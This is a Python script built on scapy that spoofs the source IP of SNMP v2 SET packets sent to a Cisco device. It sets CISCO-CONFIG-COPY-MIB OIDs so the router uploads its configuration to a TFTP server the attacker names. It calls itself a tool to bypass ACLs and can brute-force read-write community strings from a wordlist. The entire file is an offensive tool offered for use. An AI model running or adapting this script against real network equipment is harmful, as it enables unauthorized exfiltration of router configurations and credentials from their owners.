#!/usr/bin/env python
# coding=utf-8   
import os,re, sys, random

# Import scapy
try:
  from scapy.all import *
except:
  print "install scapy !"

# Functions
def getparam(count):
  if len(sys.argv) != count+1:
    print 'Fun tool to bypass ACL, Trigger a backup of a cisco from a spoofed ip'
    print 'ACL in SNMP v2 protect nothing'
    print 'To Use: '+ sys.argv[0]+  ' src_ip csco_ip tftp_ip [rwcommunity or filename]'
    sys.exit(1)
  else:
    return sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

def request(IP_src,IP_dst,IP_tftp,RWcommunity):
  IPpayload=IP(src=IP_src,dst=IP_dst)/UDP(sport=int(random.randrange(1024, 65534)),dport=161)
  Spayload=SNMP(community=RWcommunity,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.112"),value=6)])) 
  send(IPpayload/Spayload)
  Spayload=SNMP(community=RWcommunity,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.2.112"),value=1)])) 
  send(IPpayload/Spayload)
  Spayload=SNMP(community=RWcommunity,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.3.112"),value=4)])) 
  send(IPpayload/Spayload)
  Spayload=SNMP(community=RWcommunity,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.4.112"),value=1)])) 
  send(IPpayload/Spayload)
  Spayload=SNMP(community=RWcommunity,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.5.112"),value=ASN1_IPADDRESS(IP_tftp))]))
  send(IPpayload/Spayload)
  Spayload=SNMP(community=RWcommunity,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.6.112"),value=IP_dst+'-'+RWcommunity+'.txt')])) 
  send(IPpayload/Spayload)
  Spayload=SNMP(community=RWcommunity,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.112"),value=1)])) 
  send(IPpayload/Spayload)

# Main Code #####
def main():
  conf.verb = 0
  IP_src,IP_dst,IP_tftp,RWcommunity = getparam(4)
    
  if os.path.exists(RWcommunity):
    print ("Getting Community from file %s" % RWcommunity) 
    f = open(RWcommunity,'r')
    print 'Starting bruteforcing community'
    for RWcommunity in f.readlines():
        request(IP_src,IP_dst,IP_tftp,RWcommunity.rstrip('\n'))
        print ".",
    f.close()
    print '\nFinished list'
  else:
    request(IP_src,IP_dst,IP_tftp,RWcommunity)
    print ( "Payload send from %s to %s with Community %s backup to %s" % ( IP_src, IP_dst, RWcommunity , IP_tftp ))

if __name__ == '__main__':
  main()
